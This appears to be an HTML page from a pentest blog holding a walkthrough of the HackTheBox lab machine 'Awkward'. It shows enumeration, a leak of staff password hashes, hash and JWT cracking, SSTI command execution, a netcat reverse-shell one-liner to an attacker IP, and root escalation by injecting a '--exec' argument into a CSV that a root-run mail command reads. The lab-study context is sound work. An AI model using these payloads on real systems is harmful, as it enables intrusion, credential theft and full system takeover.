@@ -1,0 +1,211 @@
+<!doctype html>
+<html lang="en-us">
+  <head>
+    <title>HTB - Awkward [Medium] // meowmeowattack</title>
+    <link rel="shortcut icon" href="/favicon.ico" />
+    <meta charset="utf-8" />
+    <meta name="generator" content="Hugo 0.105.0">
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <meta name="author" content="meowmeowattack" />
+    <meta name="description" content="" />
+    <link rel="stylesheet" href="https://meowmeowattack.github.io/css/main.min.0fb49e70a30412f97ddfc418e18fefef1d9fcdebe45f634dbbba768b00fe1eec.css" />
+
+    
+    <meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="HTB - Awkward [Medium]"/>
+<meta name="twitter:description" content="TCP Scan &gt; TARGET=10.129.61.151 &amp;&amp; nmap -p$(nmap -p- --min-rate=1000 -T4 $TARGET -Pn | grep ^[0-9] | cut -d &#39;/&#39; -f 1 | tr &#39;\n&#39; &#39;,&#39; | sed s/,$//) -sC -sV -Pn -vvv $TARGET -oN nmap_tcp_all.nmap PORT STATE SERVICE REASON VERSION 22/tcp open ssh syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3 (Ubuntu Linux; protocol 2.0) 80/tcp open http syn-ack ttl 63 nginx 1.18.0 (Ubuntu) |_http-title: Site doesn&#39;t have a title (text/html). | http-methods: |_ Supported Methods: GET HEAD |_http-server-header: nginx/1."/>
+
+    <meta property="og:title" content="HTB - Awkward [Medium]" />
+<meta property="og:description" content="TCP Scan &gt; TARGET=10.129.61.151 &amp;&amp; nmap -p$(nmap -p- --min-rate=1000 -T4 $TARGET -Pn | grep ^[0-9] | cut -d &#39;/&#39; -f 1 | tr &#39;\n&#39; &#39;,&#39; | sed s/,$//) -sC -sV -Pn -vvv $TARGET -oN nmap_tcp_all.nmap PORT STATE SERVICE REASON VERSION 22/tcp open ssh syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3 (Ubuntu Linux; protocol 2.0) 80/tcp open http syn-ack ttl 63 nginx 1.18.0 (Ubuntu) |_http-title: Site doesn&#39;t have a title (text/html). | http-methods: |_ Supported Methods: GET HEAD |_http-server-header: nginx/1." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://meowmeowattack.github.io/htb/awkward/" /><meta property="article:section" content="htb" />
+<meta property="article:published_time" content="2022-10-23T22:22:53+13:00" />
+<meta property="article:modified_time" content="2022-10-23T22:22:53+13:00" />
+
+
+
+  </head>
+  <body>
+    <header class="app-header">
+      <a href="https://meowmeowattack.github.io/"><img class="app-header-avatar" src="/avatar.jpg" alt="meowmeowattack" /></a>
+      <span class="app-header-title">meowmeowattack</span>
+      <nav class="app-header-menu">
+          <a class="app-header-menu-item" href="/">/meow</a>
+             - 
+          
+          <a class="app-header-menu-item" href="/htb/">/htb</a>
+             - 
+          
+          <a class="app-header-menu-item" href="/notes/">/notes</a>
+      </nav>
+      <p>the meow of pentest</p>
+    </header>
+    <main class="app-container">
+      
+  <article class="post">
+    <header class="post-header">
+      <h1 class ="post-title">HTB - Awkward [Medium]</h1>
+      <div class="post-meta">
+        <div>
+          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-calendar">
+  <title>calendar</title>
+  <rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect><line x1="16" y1="2" x2="16" y2="6"></line><line x1="8" y1="2" x2="8" y2="6"></line><line x1="3" y1="10" x2="21" y2="10"></line>
+</svg>
+          Oct 23, 2022
+        </div>
+        <div>
+          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-clock">
+  <title>clock</title>
+  <circle cx="12" cy="12" r="10"></circle><polyline points="12 6 12 12 16 14"></polyline>
+</svg>
+          4 min read
+        </div>
+      </div>
+    </header>
+    <div class="post-content">
+      <h1 id="tcp-scan">TCP Scan</h1>
+<pre tabindex="0"><code>&gt; TARGET=10.129.61.151 &amp;&amp; nmap -p$(nmap -p- --min-rate=1000 -T4 $TARGET -Pn | grep ^[0-9] | cut -d &#39;/&#39; -f 1 | tr &#39;\n&#39; &#39;,&#39; | sed s/,$//) -sC -sV -Pn -vvv $TARGET -oN nmap_tcp_all.nmap
+
+PORT   STATE SERVICE REASON         VERSION
+22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3 (Ubuntu Linux; protocol 2.0)
+80/tcp open  http    syn-ack ttl 63 nginx 1.18.0 (Ubuntu)
+|_http-title: Site doesn&#39;t have a title (text/html).
+| http-methods: 
+|_  Supported Methods: GET HEAD
+|_http-server-header: nginx/1.18.0 (Ubuntu)
+</code></pre><ul>
+<li>domain: <code>hat-valley.htb</code></li>
+</ul>
+<h1 id="web-enum">Web Enum</h1>
+<ul>
+<li>dirsearch</li>
+</ul>
+<pre tabindex="0"><code>&gt; dirsearch -u http://hat-valley.htb/
+
+[03:25:31] 301 -  171B  - /js  -&gt;  /js/
+[03:26:28] 301 -  173B  - /css  -&gt;  /css/
+[03:26:37] 200 -    4KB - /favicon.ico
+[03:27:25] 301 -  179B  - /static  -&gt;  /static/
+</code></pre><ul>
+<li>Checking out <code>http://hat-valley.htb/js/app.js</code> found some routes</li>
+</ul>
+<pre tabindex="0"><code>baseURL = \&#34;/api/
+/all-leave
+/submit-leave
+/login
+/staff-details
+
+routes = [{\n  path: \&#34;/\&#34;,\n  name: \&#34;base\&#34;,\n  component: _Base_vue__WEBPACK_IMPORTED_MODULE_3__[\&#34;default\&#34;]\n}, {\n  path: \&#34;/hr\&#34;,\n  name: \&#34;hr\&#34;,\n  component: _HR_vue__WEBPACK_IMPORTED_MODULE_4__[\&#34;default\&#34;]\n}, {\n  path: \&#34;/dashboard\&#34;,\n  name: \&#34;dashboard\&#34;,\n  component: _Dashboard_vue__WEBPACK_IMPORTED_MODULE_5__[\&#34;default\&#34;],\n  meta: {\n    requiresAuth: true\n  }\n}, {\n  path: \&#34;/leave\&#34;,\n  name: \&#34;leave\&#34;,\n  component: _Leave_vue__WEBPACK_IMPORTED_MODULE_6__[\&#34;default\&#34;],\n  meta: {\n    requiresAuth: true\n  }\n}]
+</code></pre><ul>
+<li>subdomain enum</li>
+</ul>
+<pre tabindex="0"><code>&gt; wfuzz -c -f subdomains.txt -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -u &#34;http://hat-valley.htb/&#34; -H &#34;Host: FUZZ.hat-valley.htb&#34; --hl 8
+
+000000081:   401        7 L      12 W       188 Ch      &#34;store&#34;
+</code></pre><ul>
+<li>There is a login page at <code>http://hat-valley.htb/hr</code> with cookie value default to <code>token=guest</code></li>
+<li>Changing the value of <code>token</code> to anything will grant access to <code>http://hat-valley.htb/dashboard</code></li>
+<li>Remove any cookie and browse to <code>http://hat-valley.htb/api/staff-details</code> will reveal some user data</li>
+</ul>
+<pre tabindex="0"><code>[{&#34;user_id&#34;:1,&#34;username&#34;:&#34;christine.wool&#34;,&#34;password&#34;:&#34;6529fc6e43f9061ff4eaa806b087b13747fbe8ae0abfd396a5c4cb97c5941649&#34;,&#34;fullname&#34;:&#34;Christine Wool&#34;,&#34;role&#34;:&#34;Founder, CEO&#34;,&#34;phone&#34;:&#34;0415202922&#34;},{&#34;user_id&#34;:2,&#34;username&#34;:&#34;christopher.jones&#34;,&#34;password&#34;:&#34;e59ae67897757d1a138a46c1f501ce94321e96aa7ec4445e0e97e94f2ec6c8e1&#34;,&#34;fullname&#34;:&#34;Christopher Jones&#34;,&#34;role&#34;:&#34;Salesperson&#34;,&#34;phone&#34;:&#34;0456980001&#34;},{&#34;user_id&#34;:3,&#34;username&#34;:&#34;jackson.lightheart&#34;,&#34;password&#34;:&#34;b091bc790fe647a0d7e8fb8ed9c4c01e15c77920a42ccd0deaca431a44ea0436&#34;,&#34;fullname&#34;:&#34;Jackson Lightheart&#34;,&#34;role&#34;:&#34;Salesperson&#34;,&#34;phone&#34;:&#34;0419444111&#34;},{&#34;user_id&#34;:4,&#34;username&#34;:&#34;bean.hill&#34;,&#34;password&#34;:&#34;37513684de081222aaded9b8391d541ae885ce3b55942b9ac6978ad6f6e1811f&#34;,&#34;fullname&#34;:&#34;Bean Hill&#34;,&#34;role&#34;:&#34;System Administrator&#34;,&#34;phone&#34;:&#34;0432339177&#34;}]
+</code></pre><h1 id="hash-cracking">Hash cracking</h1>
+<ul>
+<li>Cracking the hashes with sha2-256, one of the hashes can be cracked: <code>chris123</code></li>
+</ul>
+<pre tabindex="0"><code>&gt; hashcat.exe -m 1400 hash.txt rockyou.txt
+
+# christopher.jones
+e59ae67897757d1a138a46c1f501ce94321e96aa7ec4445e0e97e94f2ec6c8e1:chris123
+</code></pre><ul>
+<li>Login to /hr using the above credential, the jwt token can be found in the cookie</li>
+</ul>
+<pre tabindex="0"><code>eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImNocmlzdG9waGVyLmpvbmVzIiwiaWF0IjoxNjY2NTk4MTQwfQ.8vrdM_HW5sIqP_4jfhri7-URx3csmL7QJEi7pAGHlF0
+</code></pre><ul>
+<li>Crack the jwt using jwt2john: <code>123beany123</code></li>
+</ul>
+<pre tabindex="0"><code>&gt; wget https://raw.githubusercontent.com/Sjord/jwtcrack/master/jwt2john.py
+&gt; python3 jwt2john.py &lt;jwt&gt; &gt; jwt.john
+&gt; john --wordlist=/usr/share/wordlists/rockyou.txt jwt.john
+</code></pre><h1 id="foothold">Foothold</h1>
+<ul>
+<li>Continue with the /dashboard, there is a tab for creating a leave request</li>
+<li>The leave request <code>reason</code> field is vulnerable to ssti, try create a request with <code>id</code> in the reason field and see the response</li>
+</ul>
+<pre tabindex="0"><code>uid=33(www-data) gid=33(www-data) groups=33(www-data)
+</code></pre><ul>
+<li>Create a request to get a reverse shell</li>
+</ul>
+<pre tabindex="0"><code>rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2&gt;&amp;1|nc &lt;ip&gt; 4444 &gt;/tmp/f
+</code></pre><h1 id="pe-bean">PE: bean</h1>
+<ul>
+<li>Checkout the script at <code>/home/bean/Documents/backup_home.sh</code></li>
+</ul>
+<pre tabindex="0"><code>#!/bin/bash
+mkdir /home/bean/Documents/backup_tmp
+cd /home/bean
+tar --exclude=&#39;.npm&#39; --exclude=&#39;.cache&#39; --exclude=&#39;.vscode&#39; -czvf /home/bean/Documents/backup_tmp/bean_backup.tar.gz .
+date &gt; /home/bean/Documents/backup_tmp/time.txt
+cd /home/bean/Documents/backup_tmp
+tar -czvf /home/bean/Documents/backup/bean_backup_final.tar.gz .
+rm -r /home/bean/Documents/backup_tmp
+</code></pre><ul>
+<li>There is a backup file at <code>/home/bean/Documents/backup/bean_backup_final.tar.gz</code></li>
+<li>Transfer this file to local and unzip it, then locate the password of <code>bean</code></li>
+</ul>
+<pre tabindex="0"><code>&gt; grep -ri bean
+bean_backup/.config/xpad/content-DS1ZS1:014mrbeanrules!#P
+</code></pre><ul>
+<li>Now, PE as bean to get the user flag</li>
+</ul>
+<h1 id="pe-root">PE: root</h1>
+<ul>
+<li>Upload linpeas and observe the following</li>
+</ul>
+<pre tabindex="0"><code>root         928  0.0  0.0  18624  3396 ?        Ss   04:47   0:00 /bin/bash /root/scripts/notify.sh
+root         945  0.0  0.0   2988  1148 ?        S    04:47   0:00  _ inotifywait --quiet --monitor --event modify /var/www/private/leave_requests.csv
+</code></pre><ul>
+<li><code>inotifywait</code> monitors changes to a file and then execute other commands</li>
+<li>For the PE part, we need to go back to the previous user <code>www-data</code>, because it&rsquo;s writable to this user</li>
+</ul>
+<pre tabindex="0"><code>&gt; ls -ls /var/www/private/leave_requests.csv
+4 -rwxrwxrwx 1 christine www-data 623 Oct 24 20:27 /var/www/private/leave_requests.csv
+</code></pre><ul>
+<li>This file contains leave requests and status</li>
+</ul>
+<pre tabindex="0"><code>&gt; cat /var/www/private/leave_requests.csv
+Leave Request Database,,,,
+,,,,
+HR System Username,Reason,Start Date,End Date,Approved
+bean.hill,Taking a holiday in Japan,23/07/2022,29/07/2022,Yes
+christine.wool,Need a break from Jackson,14/03/2022,21/03/2022,Yes
+jackson.lightheart,Great uncle&#39;s goldfish funeral + ceremony,10/05/2022,10/06/2022,No
+jackson.lightheart,Vegemite eating competition,12/12/2022,22/12/2022,No
+christopher.jones,Donating blood,19/06/2022,23/06/2022,Yes
+christopher.jones,Taking a holiday in Japan with Bean,29/07/2022,6/08/2022,Yes
+bean.hill,Inevitable break from Chris after Japan,14/08/2022,29/08/2022,No
+</code></pre><ul>
+<li>After trying to write something to <code>/var/www/private/leave_requests.csv</code>, we see that there is a new thread created as root and it seems to take the name part out for processing</li>
+</ul>
+<pre tabindex="0"><code>2022/10/24 20:30:01 CMD: UID=0    PID=46104  | mail -s Leave Request: bean.hill christine
+</code></pre><ul>
+<li>We can exploit the <code>--exec</code> parameter of the <code>mail</code> command to execute a script for us</li>
+</ul>
+<pre tabindex="0"><code># create a PE script
+bean@awkward:~$ echo -e &#39;#!/bin/bash\nchmod +s /usr/bin/bash&#39; &gt; /tmp/e.sh
+bean@awkward:~$ chmod 777 /tmp/e.sh
+
+# as www-data
+&gt; echo &#39;&#34; --exec=&#34;\!/tmp/e.sh&#34;&#39; &gt;&gt; /var/www/private/leave_requests.csv
+
+$ prompt bash to get root shell
+&gt; bash -p
+</code></pre>
+    </div>
+    <div class="post-footer">
+      
+    </div>
+  </article>
+
+    </main>
+  </body>
+</html>
